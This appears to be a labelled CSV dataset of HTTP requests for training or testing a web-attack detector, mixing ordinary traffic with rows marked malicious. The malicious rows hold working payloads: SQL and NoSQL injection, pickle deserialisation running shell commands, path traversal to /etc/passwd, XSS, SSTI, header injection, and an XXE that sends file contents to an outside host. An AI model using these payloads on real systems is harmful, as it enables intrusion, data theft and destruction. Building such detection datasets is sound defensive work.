label,text
benign,"GET /profile/settings?token=aLongSecureTokenStringThatIsRandom1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_+= HTTP/1.1
Host: my-personal-blog-site.info
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
benign,"POST /upload/new HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.57 Mobile Safari/537.36
Accept: */*
Accept-Language: en-US
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: multipart/form-data; boundary=MyBoundary12345
Content-Length: 295
Origin: https://secure-user-portal.net
Referer: https://secure-user-portal.net/profile/documents
Cookie: auth_session=bnNhbHZkdFF3Z2xvajR2dnY5M3RlMjk0d2Fj; prefs=lang_en

--MyBoundary12345
Content-Disposition: form-data; name=""document""; filename=""meeting_notes_final.pdf""
Content-Type: application/pdf

%PDF-1.5
%Encrypted
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
--MyBoundary12345
Content-Disposition: form-data; name=""tags""

meeting, notes, finalized
--MyBoundary12345--"
benign,"GET /api-docs HTTP/1.1
Host: smart-vehicle-data.ai
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.8
Connection: keep-alive"
benign,"PUT /api/v2/documents/871 HTTP/1.1
Host: docs-management-platform.io
Authorization: Bearer r3v4l1dT0k3nXabc987654321
Content-Type: application/json
Accept: application/json
User-Agent: curl/7.88.1
Connection: close
Content-Length: 158

{""documentId"":871,""title"":""Quarterly Financial Report Q2"",""author"":""finance_team"",""content"":""The financial results for Q2 show a 12% revenue increase."",""confidential"":false}"
malicious,"GET /api/v3/user/profile?userId=%2527%2520OR%2520%28SELECT%2520LOAD_FILE%28CONCAT%28%27%5C%5C%5C%5C%27%2C%28SELECT%2520version%28%29%29%2C%27.attacker-domain.com%5C%5Cdata%27%29%29%29--%2520 HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Pragma: no-cache
Cookie: authid=ab12cd34ef56gh78ij90kl12mn34op56
Origin: https://portal.api.cloud-data-services.ai"
benign,"GET /search?query=wireless+chargers&utm_source=google_search&utm_medium=cpc HTTP/1.1
Host: smart-gadget-portal.online
Accept: text/html
Referer: https://www.google.com/search?q=wireless+chargers
User-Agent: Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0
Connection: keep-alive"
malicious,"GET /api/v2/check-resource?resource=98765 HTTP/1.1
Host: integration.mailer-pipeline.md
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
X-Callback-Server: http://internal-fetch-service.exp-delay.net/trigger
Referer: https://portal.mailer-pipeline.md/dashboard
Connection: keep-alive"
benign,"POST /api/v4/accounts/password/reset-request HTTP/1.1
Host: global-finance-hub.co
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1
Origin: https://global-finance-hub.co
Content-Length: 44

{""email"":""marie.leblanc@global-finance-hub.co""}"
benign,"POST /account/settings/save HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 245
Connection: close
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Referer: https://api.cloud-data-services.ai/dashboard
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.9
Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

notification_email=user%40cloudai.io&display_mode=compact&xml_config=%3Cconfig%3E%3Cbackup%3Eweekly%3C%2Fbackup%3E%3Cnotifications%3Eenabled%3C%2Fnotifications%3E%3C%2Fconfig%3E"
benign,"DELETE /v1/users/ax7f4e HTTP/1.1
Host: members-area.socialcircle.community
Authorization: Bearer MTIzNDU2Nzg5YWJjZGVmZ2hpamtsbQ==
If-Match: ""89a7f6e5""
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0
Accept: application/json, text/plain
Connection: keep-alive"
malicious,"GET /service/command HTTP/1.1
Host: command-handler.internal-tech.ai
User-Agent: Python-requests/2.25.1
Accept: */*
X-Pickle: \x80\x03c__builtin__\nsystem\n\x85\x94\x8c\x0ewhoami\x94\x85\x94R.\r"
benign,"HEAD /portfolio/recent-projects HTTP/1.1
Host: creative-studio-space.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Via: 1.1 varnish
Connection: keep-alive"
benign,"GET /legacy/orders HTTP/1.1
Host: community.game-dev-forum.org
Accept: text/xml
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Mobile Safari/537.36
Authorization: Bearer qwertyuiop1234567890
Referer: https://community.game-dev-forum.org/dashboard
Connection: close"
benign,"GET /api/v2/products/search?query=how%20to%20bake%20bread HTTP/1.1
Host: kitchenware-hub.net
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake-token.signature
User-Agent: curl/7.85.0
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /data/analytics/view?dashboard=marketing_overview&metric=clicks,impressions,ctr&date_start=2024-04-01&date_end=2024-05-31&group_by=day&region=eu-west&segment=mobile&sort_by=impressions_desc&page=1&items_per_page=50 HTTP/1.1
Host: insights.cloud-data-services.ai
Accept: application/json
Connection: keep-alive
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept-Encoding: gzip"
benign,"PUT /api/vehicles/AB1234/status HTTP/1.1
Host: fleet-management-solutions.co
Authorization: Bearer ZxYwVuTsRqPoNmLkJhGfEdCba0987654321LmNoPq
Accept: application/xml
Content-Type: application/xml
User-Agent: python-requests/2.28.1
Content-Length: 126

<VehicleStatus><vehicleId>AB1234</vehicleId><status>maintenance_scheduled</status><location>Garage 3</location></VehicleStatus>"
benign,"HEAD /api/v1/service/health HTTP/1.1
Host: backend-api.enterprise-solutions.ai
User-Agent: curl/8.1.2
Accept: */*
DNT: 1
Connection: keep-alive"
malicious,"GET /api/users/lookup?id%5B%24ne%5D=guest HTTP/1.1
Host: member-login.tech-solutions.ai
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html
Accept-Charset: utf-8, iso-8859-1;q=0.5
Connection: close"
benign,"GET /dashboard/users?filter[type]=admin&filter[active]=true HTTP/1.1
Host: management-enterprise-suite.io
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Referer: https://management-enterprise-suite.io/login"
benign,"POST /community/post/submit HTTP/1.1
Host: community.game-dev-forum.org
Connection: keep-alive
Content-Type: multipart/form-data; boundary=--FormBoundaryA9z3b
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Cache-Control: max-age=0
Content-Length: 246
Cookie: forum_session=f8ac2c1cb7f325d73eabbcd8e97e2038; theme=dark

----FormBoundaryA9z3b
Content-Disposition: form-data; name=""threadTitle""

Shader optimization tips
----FormBoundaryA9z3b
Content-Disposition: form-data; name=""postBody""

What are some best practices for optimizing shaders in Unity 2023?
----FormBoundaryA9z3b
Content-Disposition: form-data; name=""tags""

graphics,unity3d,shaders
----FormBoundaryA9z3b--"
malicious,"GET /app/render?template=..%c0%ae%c0%af..%c0%ae%c0%af..%c0%ae%c0%afetc%c0%ae%c0%afpasswd HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /blog/article/view/523?utm_source=affiliate&utm_medium=partner HTTP/1.1
Host: community.game-dev-forum.org
Accept: text/html
Referer: https://forums.community.game-dev-forum.org/topics/latest
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
Connection: close"
benign,"PATCH /api/blog/posts/5c9a2e8b HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer 3fa85f64-5717-4562-b3fc-2c963f66afa6
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1
Accept-Language: en-US
Content-Length: 49

{""title"": ""Updated Post Title"", ""tags"": [""technology"",""web""]}"
benign,"GET /events/today HTTP/1.1
Host: metro-events-calendar.ai
Cookie: settings_b64=eyJ0aW1lem9uZSI6IkVhc3Rlcm4gVGV4YXMiLCJsaXN0RXZlbnRzIjp0cnVlfQ==
Accept: text/html,application/xhtml+xml
Accept-Language: en
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Connection: keep-alive"
benign,"GET /dashboard/stats HTTP/1.1
Host: app-insights-portal.devnet.local
X-Forwarded-For: 192.168.1.142
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
malicious,"POST /login HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml
Content-Length: 70
Referer: https://my-personal-blog-site.info/login

username=admin%00%00%0B<script>alert(document.domain)</script>&password=letmein"
benign,"PUT /profile/settings HTTP/1.1
Host: swift-finance-app.co
User-Agent: python-requests/2.28.2
Content-Type: application/json
Accept-Encoding: gzip, deflate
Content-Length: 61
Connection: keep-alive

{""bio"": ""Financial analyst &lt;b&gt;keen on data&lt;/b&gt; and cryptos""}"
benign,"GET /api/v2/products/search?query=wireless+headphones&category=audio&price_min=20&price_max=200&sort=popularity_desc&availability=in_stock&rating_min=4&brand=soundpeak&color=white&limit=40&page=5 HTTP/1.1
Host: shopstream-online.biz
Connection: keep-alive
Accept: application/json, text/plain, */*
Origin: https://shopstream-online.biz
User-Agent: python-requests/2.28.2
Accept-Encoding: gzip, deflate"
benign,"POST /user/accounts/password/reset HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
Accept: application/json
DNT: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Connection: close
Content-Length: 56

{""email"":""jacob.sanders1984@online-retail-store.biz""}"
benign,"POST /news/interview/980/comment HTTP/1.1
Host: global-tech-trends.io
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Referer: https://global-tech-trends.io/news/interview/980
Connection: close

author_name=&comment_text=Very+insightful+interview.+Looking+forward+to+more+industry+updates."
malicious,"POST /app/notifications/send HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Python-requests/2.25.1
Accept: */*
Accept-Encoding: identity
Content-Type: application/json
X-Python-Payload: \x80\x04\x95\x0e\x00\x00\x00\x00\x00\x00\x00\x8c\x06os\n\x85\x94\x8c\x06system\n\x94\x93\x94\x8c\x07echo Hi\x94\x85\x94.\n
Content-Length: 29

{""message"": ""Hello Developers!""}"
malicious,"GET /download/latest-release HTTP/1.1
Host: secure-file-transfer-protocol.org
User-Agent: Mozilla/5.0 <style>body{background:url(""javascript:alert('LogViewerXSS')"")}</style> AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Accept: */*
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
Cache-Control: no-cache"
malicious,"POST /feedback/submit HTTP/1.1
Host: express-delivery-service.org
User-Agent: Wget/1.21.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Accept: */*
Origin: https://express-delivery-service.org

comments=Great%20service!'});db.orders.deleteMany({}); //&rating=5"
benign,"POST /user/settings/profile HTTP/1.1
Host: bright-minds-learning.edu
Content-Type: application/x-www-form-urlencoded
Content-Length: 113
Origin: https://bright-minds-learning.edu
Referer: https://bright-minds-learning.edu/user/settings/profile
Cookie: session=78236947; user_pref=math
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Connection: keep-alive

display_name=Dr.+Lisa+Grant&bio=Mathematics+professor+and+education+enthusiast.&website_url=https%3A%2F%2Flisagrantmath.edu&location=Boston%2C+MA"
benign,"GET /events/calendar?id=1024&month=2024-06&format=ical HTTP/1.1
Host: global-conference-hub.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept: text/calendar,application/json;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.7
Connection: keep-alive
Referer: https://global-conference-hub.co/events
Cookie: user_session=9348df0923ad73b1"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: configmanager.enterprise-cloud.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Accept: application/json
Content-Type: application/json-patch+json
Content-Length: 73
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.qwertyuiopasdfghjklzxcvbnm123456
X-CSRF-Token: 7a839ec5286e1f9f4e431677d0adbb3f
Connection: keep-alive

[
  { ""op"": ""replace"", ""path"": ""/notifications/email"", ""value"": false }
]"
malicious,"GET /api/v1/data/summary HTTP/1.1
Host: analytics.global-insight.tech
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 <!--#config errmsg=""SSI_Error_Triggered_Successfully""--> <!--#echo var=""REMOTE_ADDR""-->
Accept: application/json, text/plain, */*
X-Requested-With: XMLHttpRequest
Cache-Control: no-cache"
malicious,"GET /search/results HTTP/1.1
Host: search.global-net.biz
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)%0d%0aX-Injected-Header:AttackPayload
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate
Cache-Control: no-cache"
benign,"POST /feedback/post HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.119 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 110
Accept: application/json, text/plain, */*
Origin: https://secure-user-portal.net
X-CSRF-Token: f3a9b7e2b5ed4c2d883097a5239f11aa
Connection: keep-alive

feedback=It+is+critical+to+ensure+UPDATE+statements+have+proper+WHERE+clauses+to+avoid+unintended+data+changes."
benign,"GET /docs/api/endpoints HTTP/1.1
Host: dev-resources.cloudplatform.dev
Accept: application/json
DNT: 1
If-None-Match: ""a1b2c3d4""
User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /static/css/main.v5.css HTTP/1.1
Host: media-content-delivery.ai
Connection: close
Accept: text/css,*/*;q=0.1
Accept-Encoding: br, gzip, deflate
User-Agent: Python-urllib/3.9"
malicious,"POST /v1/query HTTP/1.1
Host: netshop-global.online
Content-Type: application/json
Accept: application/json, text/html, */*
User-Agent: Python-urllib/3.9
Origin: https://netshop-global.online
Referer: https://netshop-global.online/api-docs
Cookie: sessionid=7c9f0a12d3af47b28f324faacf81842e

{""query"": ""/clients/client[username='superuser' and substring(password,1,1)='p']/account""}"
benign,"GET /dashboard/data?token=7f830712a10b4e53a9d5e4b17c96bb983e71d5f270aab546d4a1af2b3c9e2256a59b3e8e769465587aeb855c0dcb17121158e3a2f5939bd9b8e16665df2c0a0f HTTP/1.1
Host: analytics-data-hub.io
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
X-Forwarded-For: 203.0.113.45"
malicious,"GET /app/user/settings HTTP/1.1
Host: analytics.secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://trusted.referrer.com/{# {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('uname -a').read() }} #}
Cache-Control: no-cache
Connection: keep-alive"
benign,"GET /users?filter[type]=admin&filter[active]=true HTTP/1.1
Host: community.game-dev-forum.org
Accept: application/json
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/112.0
DNT: 1
Cache-Control: no-cache"
malicious,"POST /service/xml/submit HTTP/1.1
Host: api.fintech-secure-payments.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Content-Type: application/xml
Accept: application/xml
Accept-Encoding: gzip, deflate
Content-Length: 272

<!DOCTYPE payment [
<!ENTITY % file SYSTEM ""file:///etc/hostname"">
<!ENTITY % dtd SYSTEM ""http://exfiltration.gateway-fintech.biz/payload.dtd"">
%dtd;
%send;
]>
<payment><account>12345</account></payment>"
benign,"GET /assets/fonts/lato-italic.ttf HTTP/1.1
Host: digitalmarketing-pro.biz
Connection: keep-alive
Accept: application/font-ttf,*/*;q=0.8
Referer: https://digitalmarketing-pro.biz/css/lato.css
Origin: https://digitalmarketing-pro.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1"
